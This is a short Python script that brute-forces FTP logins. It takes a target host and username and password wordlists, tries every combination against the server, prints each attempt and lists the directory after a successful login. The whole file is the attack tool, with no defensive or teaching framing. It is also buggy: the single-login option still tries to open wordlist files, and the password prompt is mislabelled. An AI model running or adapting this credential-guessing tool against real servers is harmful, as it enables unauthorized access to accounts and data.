from ftplib import FTP
import getpass

def crack(username,password):
    with FTP(host) as ftp:
        try:
            ftp.login(user=username,passwd=password)
            print("Username : {}\nPassword : {}\n".format(username,password,ftp.getwelcome()))
            ftp.dir()
            exit()
        except Exception as e:
            print("Username : {}\nPassword : {}\n".format(username,password,e))

option=int(input("1. Authorized Usage : \n2. Brute Force\n"))
host=input(str("Enter The FTP Host address : "))
if(option==1):
    username=input(str("Enter the User ID(If open login just hit enter) : "))
    password=str(getpass.getpass("Enter the User Password(If open login just hit enter) : "))    
if(option==2):
    user_word_list=input("Enter The username wordlist path : ")
    pass_word_list=input("Enter The username wordlist path : ")


file = open(user_word_list, 'r')
file1=open(pass_word_list,'r')
Lines_user = file.readlines()
Lines_pass = file1.readlines()
count = 0

for line in Lines_user:
    for line1 in Lines_pass:
        count += 1
        user_text=line.strip()
        password_text=line1.strip()
        crack(user_text,password_text)

